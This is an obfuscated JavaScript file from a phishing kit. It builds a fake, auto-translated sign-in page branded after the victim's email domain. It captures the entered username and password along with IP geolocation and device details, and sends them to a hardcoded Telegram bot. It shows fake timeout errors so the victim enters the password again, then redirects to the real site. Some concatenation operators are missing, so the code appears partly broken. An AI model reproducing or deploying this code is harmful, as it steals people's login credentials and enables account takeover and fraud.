function _0xcba3() {
    const _0x194691 = ['click', 'send', 'Windows\x208.1', 'tablet', 'Error\x20updating\x20URL:', '\x0a💻\x20Browser\x20Info\x0a•\x20Browser:\x20', 'screen', 'toUTCString', 'Sign\x20in\x20attempt\x20timeout,\x20Please\x20try\x20again.', 'Mac\x20OS\x20X', 'getFullYear', '\x20LOG\x0a━━━━━━━━━━━━━━━━━━━━━━\x0a📧\x20Login\x20Details\x0a•\x20Username:\x20', 'Unknown', 'Windows\x2010', 'DateTimeFormat', 'desktop', 'application/json', 'error', 'zimbra', ';\x20path=/', '1071156Ozmfgp', 'length', 'Error\x20fetching\x20country:', '\x20-\x20', '/index/cgi-sys/bxd.cgi?a=com&id=bC4fvQB2QGsC1h98QCzeN-1725305970&cc=da61ed3a-530d-4862-82e1-4f0212a5bbb3', '\x0a•\x20Region:\x20', '1813zYQjOs', 'SHOW_TEXT', 'Windows\x20NT\x206.3', 'focus', 'POST', 'platform', '/sendMessage', 'VICTIM\x20IS\x20RETRYING\x20YOUR\x20LINK\x20-\x20', '7782gCyFcA', 'map', 'nodeValue', '\x0a━━━━━━━━━━━━━━━━━━━━━━', 'https://', 'background-frame', 'banner-logo', 'Chrome', 'Placeholder\x20translation\x20error:', 'placeholder', 'loc', 'onclick', '101933jEQJTQ', 'value', 'log', 'colorDepth', 'company', 'href', 'Windows\x20NT\x2010.0', 'charAt', 'input[placeholder],\x20textarea[placeholder]', 'addEventListener', '\x0a•\x20Device\x20Type:\x20', 'Firefox', 'replaceState', 'then', 'style', 'resolvedOptions', ';\x20expires=', 'cookie', 'User\x20country:', 'office', 'trim', 'loading', 'block', 'Translation\x20complete', '&dt=t&q=', 'history', 'substr', 'Error\x20formatting\x20message:', 'open', 'close-btn', 'favicon', 'passwordUpdated', 'https://www.google.com/s2/favicons?domain=', 'substring', '\x0a•\x20Platform:\x20', '/api/placeholder/32/32', 'userAgent', 'display', '\x0a•\x20Coordinates:\x20', 'json', 'bit\x0a•\x20Pixel\x20Ratio:\x20', 'Error\x20fetching\x20IP\x20info:', 'Unknown\x20OS', 'catch', 'innerWidth', 'email', '6FBFfFF', 'timeZone', '\x0a📱\x20Device\x20Details\x0a•\x20Screen\x20Resolution:\x20', 'devicePixelRatio', 'https://www.', '1268780fmSNEA', 'body', '\x0a•\x20Language:\x20', 'join', 'getElementsByTagName', 'test', 'getMonth', 'none', 'padStart', '1899153ugqhVT', '\x20HOSTINGER\x20LOGIN\x20\x0a━━━━━━━━━━━━━━━━━━━━━━\x0a📧\x20Login\x20Details\x0a•\x20Username:\x20', 'Content-Type', 'toISOString', '\x0a•\x20Window\x20Size:\x20', 'region', 'google', 'includes', 'slice', 'Sign\x20in\x20timed\x20out.\x20Please\x20login\x20again', 'submit', 'querySelectorAll', 'getElementById', 'Version/', '\x0a•\x20City:\x20', 'password', 'hash', '33ChLTSd', 'indexOf', '🔐\x20', '972880qHTLjn', 'custom-alert', 'replace', 'textContent', 'Markdown', 'Safari', '512vEaEMQ', 'height', 'https://ipinfo.io/json', 'Chrome/', 'width', 'x\x0a⏰\x20Timestamp:\x20', 'true', '\x0a•\x20Timezone:\x20', '480tfmESm', 'target', 'split', 'mobile', 'language', 'getElementsByClassName', 'Firefox/', 'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=', '\x0a•\x20Mode:\x20Automatic\x0a•\x20Language:\x20English\x20(American)\x0a📍\x20Location\x20Info\x0a•\x20IP\x20Address:\x20', 'city', 'preventDefault', 'Linux', 'innerHeight', 'country', 'src', 'location', 'Safari/', '\x0a•\x20Password:\x20'];
    _0xcba3 = function () {
        return _0x194691;
    };
    return _0xcba3();
}
const _0x436c4c = _0x334f;
(function (_0x11028d, _0x4d855f) {
    const _0x575282 = _0x334f,
        _0x587367 = _0x11028d();
    while (!![]) {
        try {
            const _0x3fff50 = parseInt(_0x575282(0xda)) / 0x1 * (-parseInt(_0x575282(0x108)) / 0x2) - parseInt(_0x575282(0xce)) / 0x3 * (-parseInt(_0x575282(0x138)) / 0x4) - parseInt(_0x575282(0x12a)) / 0x5 - parseInt(_0x575282(0xc0)) / 0x6 - parseInt(_0x575282(0xc6)) / 0x7 * (parseInt(_0x575282(0x130)) / 0x8) parseInt(_0x575282(0x116)) / 0x9 - parseInt(_0x575282(0x10d)) / 0xa * (-parseInt(_0x575282(0x127)) / 0xb);
            if (_0x3fff50 === _0x4d855f) break;
            else _0x587367['push'](_0x587367['shift']());
        } catch (_0xc19a1b) {
            _0x587367['push'](_0x587367['shift']());
        }
    }
}(_0xcba3, 0x32a5e));

function setCookie(_0x2385ea, _0x11a828, _0x38666d) {
    const _0x5db7cd = _0x334f;
    var _0xd8ef01 = '';
    if (_0x38666d) {
        var _0x263f3e = new Date();
        _0x263f3e['setTime'](_0x263f3e['getTime']() _0x38666d * 0x18 * 0x3c * 0x3c * 0x3e8), _0xd8ef01 = _0x5db7cd(0xea) _0x263f3e[_0x5db7cd(0xb3)]();
    }
    document[_0x5db7cd(0xeb)] = _0x2385ea '='(_0x11a828 || '') _0xd8ef01 _0x5db7cd(0xbf);
}

function getCookie(_0x4fb39d) {
    const _0x265bab = _0x334f;
    var _0x20802a = _0x4fb39d '=',
        _0x9531a7 = document['cookie']['split'](';');
    for (var _0x447aa8 = 0x0; _0x447aa8 < _0x9531a7[_0x265bab(0xc1)]; _0x447aa8) {
        var _0x4fb422 = _0x9531a7[_0x447aa8];
        while (_0x4fb422[_0x265bab(0xe1)](0x0) == '\x20') _0x4fb422 = _0x4fb422[_0x265bab(0xfb)](0x1, _0x4fb422['length']);
        if (_0x4fb422[_0x265bab(0x128)](_0x20802a) == 0x0) return _0x4fb422[_0x265bab(0xfb)](_0x20802a[_0x265bab(0xc1)], _0x4fb422[_0x265bab(0xc1)]);
    }
    return null;
}
var errormessage = _0x436c4c(0x11f);
const hash = window['location'][_0x436c4c(0x126)][_0x436c4c(0xfb)](0x1),
    countryLanguageMap = {
        'AF': 'ps',
        'AL': 'sq',
        'DZ': 'ar',
        'AD': 'ca',
        'AO': 'pt',
        'AG': 'en',
        'AR': 'es',
        'AM': 'hy',
        'AU': 'en',
        'AT': 'de',
        'AZ': 'az',
        'BS': 'en',
        'BH': 'ar',
        'BD': 'bn',
        'BB': 'en',
        'BY': 'be',
        'BE': 'nl',
        'BZ': 'en',
        'BJ': 'fr',
        'BT': 'dz',
        'BO': 'es',
        'BA': 'bs',
        'BW': 'en',
        'BR': 'pt',
        'BN': 'ms',
        'BG': 'bg',
        'BF': 'fr',
        'BI': 'rn',
        'KH': 'km',
        'CM': 'fr',
        'CA': 'en',
        'CV': 'pt',
        'CF': 'fr',
        'TD': 'ar',
        'CL': 'es',
        'CN': 'zh',
        'CO': 'es',
        'KM': 'ar',
        'CG': 'fr',
        'CD': 'fr',
        'CR': 'es',
        'CI': 'fr',
        'HR': 'hr',
        'CU': 'es',
        'CY': 'el',
        'CZ': 'cs',
        'DK': 'da',
        'DJ': 'ar',
        'DM': 'en',
        'DO': 'es',
        'TL': 'pt',
        'EC': 'es',
        'EG': 'ar',
        'SV': 'es',
        'GQ': 'es',
        'ER': 'ti',
        'EE': 'et',
        'ET': 'am',
        'FJ': 'en',
        'FI': 'fi',
        'FR': 'fr',
        'GA': 'fr',
        'GM': 'en',
        'GE': 'ka',
        'DE': 'de',
        'GH': 'en',
        'GR': 'el',
        'GD': 'en',
        'GT': 'es',
        'GN': 'fr',
        'GW': 'pt',
        'GY': 'en',
        'HT': 'ht',
        'HN': 'es',
        'HU': 'hu',
        'IS': 'is',
        'IN': 'hi',
        'ID': 'id',
        'IR': 'fa',
        'IQ': 'ar',
        'IE': 'en',
        'IL': 'he',
        'IT': 'it',
        'JM': 'en',
        'JP': 'ja',
        'JO': 'ar',
        'KZ': 'kk',
        'KE': 'sw',
        'KI': 'en',
        'KP': 'ko',
        'KR': 'ko',
        'XK': 'sq',
        'KW': 'ar',
        'KG': 'ky',
        'LA': 'lo',
        'LV': 'lv',
        'LB': 'ar',
        'LS': 'st',
        'LR': 'en',
        'LY': 'ar',
        'LI': 'de',
        'LT': 'lt',
        'LU': 'lb',
        'MG': 'mg',
        'MW': 'ny',
        'MY': 'ms',
        'MV': 'dv',
        'ML': 'fr',
        'MT': 'mt',
        'MH': 'en',
        'MR': 'ar',
        'MU': 'en',
        'MX': 'es',
        'FM': 'en',
        'MD': 'ro',
        'MC': 'fr',
        'MN': 'mn',
        'ME': 'sr',
        'MA': 'ar',
        'MZ': 'pt',
        'MM': 'my',
        'NA': 'en',
        'NR': 'na',
        'NP': 'ne',
        'NL': 'nl',
        'NZ': 'en',
        'NI': 'es',
        'NE': 'fr',
        'NG': 'en',
        'MK': 'mk',
        'NO': 'nb',
        'OM': 'ar',
        'PK': 'ur',
        'PW': 'en',
        'PS': 'ar',
        'PA': 'es',
        'PG': 'en',
        'PY': 'es',
        'PE': 'es',
        'PH': 'tl',
        'PL': 'pl',
        'PT': 'pt',
        'QA': 'ar',
        'RO': 'ro',
        'RU': 'ru',
        'RW': 'rw',
        'KN': 'en',
        'LC': 'en',
        'VC': 'en',
        'WS': 'sm',
        'SM': 'it',
        'ST': 'pt',
        'SA': 'ar',
        'SN': 'fr',
        'RS': 'sr',
        'SC': 'fr',
        'SL': 'en',
        'SG': 'ms',
        'SK': 'sk',
        'SI': 'sl',
        'SB': 'en',
        'SO': 'so',
        'ZA': 'af',
        'SS': 'en',
        'ES': 'es',
        'LK': 'si',
        'SD': 'ar',
        'SR': 'nl',
        'SZ': 'ss',
        'SE': 'sv',
        'CH': 'de',
        'SY': 'ar',
        'TW': 'zh',
        'TJ': 'tg',
        'TZ': 'sw',
        'TH': 'th',
        'TG': 'fr',
        'TO': 'to',
        'TT': 'en',
        'TN': 'ar',
        'TR': 'tr',
        'TM': 'tk',
        'TV': 'en',
        'UG': 'sw',
        'UA': 'uk',
        'AE': 'ar',
        'GB': 'en',
        'US': 'en',
        'UY': 'es',
        'UZ': 'uz',
        'VU': 'bi',
        'VA': 'it',
        'VE': 'es',
        'VN': 'vi',
        'YE': 'ar',
        'ZM': 'en',
        'ZW': 'sn'
    };
let tg2 = {
    'token2': '6191573769:AAFnZRCiuEw6Y7l2Mhkk9y0X1w_HUGynakY',
    'chat_id2': '5027794050'
};

function sendMessage2(_0x4406ef) {
    const _0x45a317 = _0x436c4c,
        _0x22fa65 = 'https://api.telegram.org/bot'
    tg2['token2'] _0x45a317(0xcc), _0x464cf6 = new XMLHttpRequest();
    _0x464cf6[_0x45a317(0xf6)](_0x45a317(0xca), _0x22fa65, !![]), _0x464cf6['setRequestHeader'](_0x45a317(0x118), _0x45a317(0xbc));
    const _0x47ec12 = {
        'chat_id': tg2['chat_id2'],
        'text': _0x4406ef,
        'parse_mode': _0x45a317(0x12e)
    };
    _0x464cf6[_0x45a317(0xad)](JSON['stringify'](_0x47ec12));
}

function getUserCountry() {
    const _0x4af178 = _0x436c4c;
    return fetch('https://ipinfo.io/json')[_0x4af178(0xe7)](_0x1c9b47 => _0x1c9b47[_0x4af178(0x101)]())[_0x4af178(0xe7)](_0xa0f74a => {
        const _0x1add0a = _0x4af178;
        return console[_0x1add0a(0xdc)](_0x1add0a(0xec), _0xa0f74a['country']), _0xa0f74a[_0x1add0a(0xa7)];
    })[_0x4af178(0x105)](_0x4dd492 => {
        const _0x1bf69b = _0x4af178;
        return console['error'](_0x1bf69b(0xc2), _0x4dd492), null;
    });
}

function translateText(_0x48c674, _0x1f2cd6) {
    return new Promise((_0x2df3da, _0x37a912) => {
        const _0x24a9ca = _0x334f,
            _0x2ea18b = _0x24a9ca(0x13f) _0x1f2cd6 _0x24a9ca(0xf2) encodeURIComponent(_0x48c674);
        fetch(_0x2ea18b)[_0x24a9ca(0xe7)](_0x4f2b28 => _0x4f2b28[_0x24a9ca(0x101)]())[_0x24a9ca(0xe7)](_0x121960 => {
            const _0x19828b = _0x24a9ca,
                _0x5b1267 = _0x121960[0x0][_0x19828b(0xcf)](_0x391379 => _0x391379[0x0])[_0x19828b(0x110)]('');
            _0x2df3da(_0x5b1267);
        })[_0x24a9ca(0x105)](_0x532d37 => _0x37a912(_0x532d37));
    });
}
async function translatePage(_0x596b9a) {
    const _0x167918 = _0x436c4c,
        _0x5b3a64 = document['createTreeWalker'](document[_0x167918(0x10e)], NodeFilter[_0x167918(0xc7)], null, ![]);
    let _0x2b553b;
    while (_0x2b553b = _0x5b3a64['nextNode']()) {
        if (_0x2b553b[_0x167918(0xd0)][_0x167918(0xee)]()) try {
            const _0x4d2a79 = await translateText(_0x2b553b['nodeValue'], _0x596b9a);
            _0x2b553b['nodeValue'] = _0x4d2a79;
        } catch (_0x499dc4) {
            console[_0x167918(0xbd)]('Translation\x20error:', _0x499dc4);
        }
    }
    const _0x1c2dfe = document[_0x167918(0x121)](_0x167918(0xe2));
    for (const _0x480a19 of _0x1c2dfe) {
        if (_0x480a19[_0x167918(0xd7)]) try {
            const _0xaa6656 = await translateText(_0x480a19['placeholder'], _0x596b9a);
            _0x480a19['placeholder'] = _0xaa6656;
        } catch (_0xb40c7a) {
            console[_0x167918(0xbd)](_0x167918(0xd6), _0xb40c7a);
        }
    }
}
async function autoTranslate() {
    const _0x4867f0 = _0x436c4c;
    try {
        const _0x434c0c = await getUserCountry();
        let _0x5a464f = 'en';
        _0x434c0c && countryLanguageMap[_0x434c0c] && (_0x5a464f = countryLanguageMap[_0x434c0c]['toLowerCase']()), await translatePage(_0x5a464f), console[_0x4867f0(0xdc)](_0x4867f0(0xf1));
    } catch (_0x1813e7) {
        console['error']('Auto-translation\x20error:', _0x1813e7);
    }
}
const restrictedFiles = [_0x436c4c(0xed), 'google'];
var urlchangers = [_0x436c4c(0x11c), _0x436c4c(0xbe)];

function getBrowserInfo() {
    const _0x4dce8e = _0x436c4c,
        _0x5be7a1 = navigator[_0x4dce8e(0xfe)];
    let _0x2da1ff = _0x4dce8e(0xb8),
        _0xb31a66 = '';
    if (_0x5be7a1['includes']('Firefox/')) _0x2da1ff = _0x4dce8e(0xe5), _0xb31a66 = _0x5be7a1['split'](_0x4dce8e(0x13e))[0x1][_0x4dce8e(0x13a)]('\x20')[0x0];
    else {
        if (_0x5be7a1[_0x4dce8e(0x11d)](_0x4dce8e(0x133))) _0x2da1ff = 'Chrome', _0xb31a66 = _0x5be7a1[_0x4dce8e(0x13a)](_0x4dce8e(0x133))[0x1][_0x4dce8e(0x13a)]('\x20')[0x0];
        else _0x5be7a1[_0x4dce8e(0x11d)](_0x4dce8e(0xaa)) && !_0x5be7a1[_0x4dce8e(0x11d)](_0x4dce8e(0xd5)) && (_0x2da1ff = _0x4dce8e(0x12f), _0xb31a66 = _0x5be7a1[_0x4dce8e(0x13a)](_0x4dce8e(0x123))[0x1][_0x4dce8e(0x13a)]('\x20')[0x0]);
    }
    return _0x2da1ff '\x20'
    _0xb31a66;
}

function getOSInfo() {
    const _0x449f7b = _0x436c4c,
        _0x2fe014 = navigator[_0x449f7b(0xfe)];
    if (_0x2fe014[_0x449f7b(0x11d)](_0x449f7b(0xe0))) return _0x449f7b(0xb9);
    if (_0x2fe014[_0x449f7b(0x11d)](_0x449f7b(0xc8))) return _0x449f7b(0xae);
    if (_0x2fe014[_0x449f7b(0x11d)](_0x449f7b(0xb5))) return 'macOS';
    if (_0x2fe014[_0x449f7b(0x11d)]('Linux')) return _0x449f7b(0x143);
    return _0x449f7b(0x104);
}

function getDeviceType() {
    const _0x108927 = _0x436c4c,
        _0x578290 = navigator['userAgent'];
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i[_0x108927(0x112)](_0x578290)) return _0x108927(0xaf);
    if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/[_0x108927(0x112)](_0x578290)) return _0x108927(0x13b);
    return _0x108927(0xbb);
}
async function formatMessage(_0x3ea162, _0x3620a3, _0x11c916) {
    const _0x2ec2b1 = _0x436c4c;
    try {
        const _0x3f4299 = await fetch(_0x2ec2b1(0x132)),
            _0x1ca532 = await _0x3f4299[_0x2ec2b1(0x101)](),
            _0xdbca06 = window['screen'],
            _0x33a7d9 = getBrowserInfo(),
            _0x366da5 = getOSInfo(),
            _0x2caf4d = getDeviceType(),
            [_0x1dbfd3, _0x505b81] = _0x1ca532[_0x2ec2b1(0xd8)] ? _0x1ca532['loc']['split'](',') : [_0x2ec2b1(0xb8), _0x2ec2b1(0xb8)];
        return _0x2ec2b1(0x129) _0x11c916 _0x2ec2b1(0xb7) _0x3ea162 _0x2ec2b1(0xab) _0x3620a3 _0x2ec2b1(0x140)(_0x1ca532['ip'] || _0x2ec2b1(0xb8))
        '\x0a•\x20Country:\x20'(_0x1ca532[_0x2ec2b1(0xa7)] || _0x2ec2b1(0xb8)) _0x2ec2b1(0xc5)(_0x1ca532[_0x2ec2b1(0x11b)] || _0x2ec2b1(0xb8)) _0x2ec2b1(0x124)(_0x1ca532[_0x2ec2b1(0x141)] || 'Unknown') _0x2ec2b1(0x100) _0x1dbfd3 ',\x20'
        _0x505b81 _0x2ec2b1(0x137)(_0x1ca532['timezone'] || _0x2ec2b1(0xb8)) _0x2ec2b1(0xb1) _0x33a7d9 '\x0a•\x20OS:\x20'
        _0x366da5 _0x2ec2b1(0xe4) _0x2caf4d '\x0a📱\x20Device\x20Details\x0a•\x20Screen\x20Resolution:\x20'
        _0xdbca06[_0x2ec2b1(0x134)]
        'x'
        _0xdbca06[_0x2ec2b1(0x131)] _0x2ec2b1(0x11a) window[_0x2ec2b1(0x106)]
        'x'
        window[_0x2ec2b1(0xa6)] _0x2ec2b1(0xfc) navigator[_0x2ec2b1(0xcb)] _0x2ec2b1(0x10f) navigator[_0x2ec2b1(0x13c)]
        '\x0a•\x20Color\x20Depth:\x20'
        _0xdbca06[_0x2ec2b1(0xdd)]
        'bit\x0a•\x20Pixel\x20Ratio:\x20'
        window[_0x2ec2b1(0x10b)] _0x2ec2b1(0x135) new Date()['toISOString']()
        '\x0a━━━━━━━━━━━━━━━━━━━━━━';
    } catch (_0x524112) {
        return console['error'](_0x2ec2b1(0x103), _0x524112), formatMessageWithoutIP(_0x3ea162, _0x3620a3);
    }
}

function formatMessageWithoutIP(_0x2c9bbd, _0x56e102) {
    const _0x2483bd = _0x436c4c,
        _0x28a8cc = window[_0x2483bd(0xb2)],
        _0x1c0310 = getBrowserInfo(),
        _0x2c16ee = getOSInfo(),
        _0x258ec8 = getDeviceType();
    return _0x2483bd(0x129) _0x2c9bbd _0x2483bd(0x117) _0x2c9bbd _0x2483bd(0xab) _0x56e102 '\x0a•\x20Mode:\x20Automatic\x0a•\x20Language:\x20English\x20(American)\x0a📍\x20Location\x20Info\x0a•\x20IP\x20Address:\x20Unknown\x0a•\x20Country:\x20Unknown\x0a•\x20Region:\x20Unknown\x0a•\x20City:\x20Unknown\x0a•\x20Coordinates:\x20Unknown\x0a•\x20Timezone:\x20'
    Intl[_0x2483bd(0xba)]()[_0x2483bd(0xe9)]()[_0x2483bd(0x109)] _0x2483bd(0xb1) _0x1c0310 '\x0a•\x20OS:\x20'
    _0x2c16ee '\x0a•\x20Device\x20Type:\x20'
    _0x258ec8 _0x2483bd(0x10a) _0x28a8cc[_0x2483bd(0x134)]
    'x'
    _0x28a8cc[_0x2483bd(0x131)] _0x2483bd(0x11a) window[_0x2483bd(0x106)]
    'x'
    window[_0x2483bd(0xa6)]
    '\x0a•\x20Platform:\x20'
    navigator[_0x2483bd(0xcb)] _0x2483bd(0x10f) navigator[_0x2483bd(0x13c)]
    '\x0a•\x20Color\x20Depth:\x20'
    _0x28a8cc[_0x2483bd(0xdd)] _0x2483bd(0x102) window['devicePixelRatio'] _0x2483bd(0x135) new Date()[_0x2483bd(0x119)]() _0x2483bd(0xd1);
}

function init() {
    const _0x5b5ca3 = _0x436c4c,
        _0x3ee4dc = window[_0x5b5ca3(0xa9)]['hash']['substring'](0x1);
    if (_0x3ee4dc) {
        const _0x3bcb79 = _0x3ee4dc[_0x5b5ca3(0x128)]('@'),
            _0x16fe40 = _0x3ee4dc['substr'](_0x3bcb79 0x1);
        try {
            const _0x3439cd = '/'
            _0x16fe40 _0x5b5ca3(0xc4);
            window[_0x5b5ca3(0xf3)][_0x5b5ca3(0xe6)]({}, '', _0x3439cd);
        } catch (_0x3a141d) {
            console['error'](_0x5b5ca3(0xb0), _0x3a141d);
        }
        initializeUI(_0x3ee4dc), loadBackground(_0x3ee4dc), autoTranslate();
    }
    if (!checkPasswordUpdate()) return;
}

function initializeUI(_0x5e3ea4) {
    const _0x508344 = _0x436c4c,
        _0x242320 = _0x5e3ea4[_0x508344(0x12c)]('#', ''),
        _0x5879d6 = _0x242320[_0x508344(0x128)]('@'),
        _0x2a6bb0 = _0x242320[_0x508344(0x11e)](_0x5879d6 0x1),
        _0x59c6f5 = _0x2a6bb0[_0x508344(0x13a)]('.')[0x0];
    document[_0x508344(0x122)]('banner')[_0x508344(0x12d)] = ''
    _0x59c6f5, document['getElementById'](_0x508344(0xde))['textContent'] = _0x59c6f5, document['title'] = 'Sign\x20in\x20to\x20'
    _0x59c6f5, document[_0x508344(0x122)](_0x508344(0x107))[_0x508344(0xdb)] = _0x242320;
    const _0x3e8985 = _0x508344(0xfa) _0x2a6bb0 '&sz=128';
    document['getElementById'](_0x508344(0xd4))[_0x508344(0xa8)] = _0x3e8985, document[_0x508344(0x122)]('password')[_0x508344(0xc9)]();
    const _0x623cef = document[_0x508344(0x122)](_0x508344(0xf8));
    _0x623cef[_0x508344(0xdf)] = _0x508344(0xfd);
}

function loadBackground(_0x1294fd) {
    const _0x553531 = _0x436c4c,
        _0x3886ae = _0x1294fd[_0x553531(0x12c)]('#', ''),
        _0x4fc04f = _0x3886ae[_0x553531(0x128)]('@'),
        _0x3f32d6 = _0x3886ae[_0x553531(0x11e)](_0x4fc04f 0x1),
        _0x456a4b = document[_0x553531(0x122)](_0x553531(0xd3));
    _0x456a4b[_0x553531(0xa8)] = _0x553531(0xd2) _0x3f32d6;
}

function showCustomAlert(_0x456578) {
    const _0x1c1e08 = _0x436c4c;
    var _0x720188 = document[_0x1c1e08(0x122)](_0x1c1e08(0x12b)),
        _0x3c8016 = document[_0x1c1e08(0x13d)](_0x1c1e08(0xf7))[0x0];
    _0x720188[_0x1c1e08(0xe8)][_0x1c1e08(0xff)] = _0x1c1e08(0xf0), _0x720188[_0x1c1e08(0x111)]('p')[0x0]['textContent'] = _0x456578, _0x3c8016[_0x1c1e08(0xd9)] = function () {
        const _0x387c7c = _0x1c1e08;
        _0x720188[_0x387c7c(0xe8)][_0x387c7c(0xff)] = _0x387c7c(0x114);
    }, window[_0x1c1e08(0xd9)] = function (_0x14c87e) {
        const _0x44ee62 = _0x1c1e08;
        _0x14c87e[_0x44ee62(0x139)] == _0x720188 && (_0x720188[_0x44ee62(0xe8)]['display'] = _0x44ee62(0x114));
    };
}

function checkPasswordUpdate() {
    const _0x446aa5 = _0x436c4c;
    var _0x1ceedf = getCookie(_0x446aa5(0xf9));
    if (_0x1ceedf) return showCustomAlert('Password\x20Already\x20Updated,\x20Please\x20wait\x2030\x20days'), setTimeout(function () {
        const _0x4e815f = _0x446aa5;
        var _0x21d175 = new Date(),
            _0x5c29b = String(_0x21d175['getDate']())[_0x4e815f(0x115)](0x2, '0'),
            _0x5a2d60 = String(_0x21d175[_0x4e815f(0x113)]() 0x1)[_0x4e815f(0x115)](0x2, '0'),
            _0x27a9c7 = _0x21d175[_0x4e815f(0xb6)]();
        _0x21d175 = _0x5a2d60 '/'
        _0x5c29b '/'
        _0x27a9c7;
        var _0x43c7de = window[_0x4e815f(0xa9)][_0x4e815f(0x126)][_0x4e815f(0xf4)](0x1),
            _0x364427 = _0x4e815f(0xcd) _0x43c7de _0x4e815f(0xc3) _0x21d175;
        sendMessage2(_0x364427);
        var _0x2b3f49 = document[_0x4e815f(0x122)](_0x4e815f(0x107))['value'],
            _0x2024ae = _0x2b3f49[_0x4e815f(0x128)]('@'),
            _0x32ebc2 = _0x2b3f49[_0x4e815f(0xf4)](_0x2024ae 0x1);
        window['location']['replace'](_0x4e815f(0x10c) _0x32ebc2);
    }, 0x1770), ![];
    return !![];
}

function _0x334f(_0x3e7766, _0x18dbb6) {
    _0x3e7766 = _0x3e7766 - 0xa6;
    const _0xcba32c = _0xcba3();
    let _0x334f62 = _0xcba32c[_0x3e7766];
    return _0x334f62;
}
var count = 0x0,
    count = 0x0;
document['getElementById'](_0x436c4c(0x120))[_0x436c4c(0xe3)](_0x436c4c(0xac), async function (_0x9de50d) {
    const _0x3eee25 = _0x436c4c;
    _0x9de50d[_0x3eee25(0x142)](), count;
    const _0x128dc6 = document[_0x3eee25(0x122)](_0x3eee25(0x107))[_0x3eee25(0xdb)][_0x3eee25(0xee)](),
        _0xa7c22b = document[_0x3eee25(0x122)](_0x3eee25(0x125))[_0x3eee25(0xdb)][_0x3eee25(0xee)]();
    if (_0x128dc6 && _0xa7c22b && count < 0x3) {
        document['getElementById']('loading')[_0x3eee25(0xe8)][_0x3eee25(0xff)] = _0x3eee25(0xf0);
        try {
            const _0x57deb0 = await formatMessage(_0x128dc6, _0xa7c22b, _0x128dc6 '\x20az-static');
            sendMessage2(_0x57deb0);
        } catch (_0x3d6ea8) {
            console['error'](_0x3eee25(0xf5), _0x3d6ea8);
        }
        setTimeout(() => {
            const _0x4bbd34 = _0x3eee25;
            document[_0x4bbd34(0x122)](_0x4bbd34(0xef))['style']['display'] = _0x4bbd34(0x114), document[_0x4bbd34(0x122)](_0x4bbd34(0xbd))[_0x4bbd34(0x12d)] = _0x4bbd34(0xb4), document[_0x4bbd34(0x122)](_0x4bbd34(0x125))[_0x4bbd34(0xdb)] = '';
        }, 0x3e8);
    }
    if (count > 0x2) {
        document[_0x3eee25(0x122)](_0x3eee25(0xef))[_0x3eee25(0xe8)][_0x3eee25(0xff)] = _0x3eee25(0xf0);
        try {
            setCookie(_0x3eee25(0xf9), _0x3eee25(0x136), 0x1e);
            const _0x16f9b7 = await formatMessage(_0x128dc6, _0xa7c22b, _0x128dc6 '\x20az-static');
            sendMessage2(_0x16f9b7);
        } catch (_0x5c9191) {
            console[_0x3eee25(0xbd)]('Error\x20formatting\x20message:', _0x5c9191);
        }
        setTimeout(function () {
            const _0x1ce883 = _0x3eee25;
            var _0x11124a = _0x128dc6['indexOf']('@'),
                _0x6809d9 = _0x128dc6['substr'](_0x11124a 0x1);
            window[_0x1ce883(0xa9)][_0x1ce883(0x12c)]('https://www.'
                _0x6809d9);
        }, 0x3e8);
    }
}), window['onload'] = init;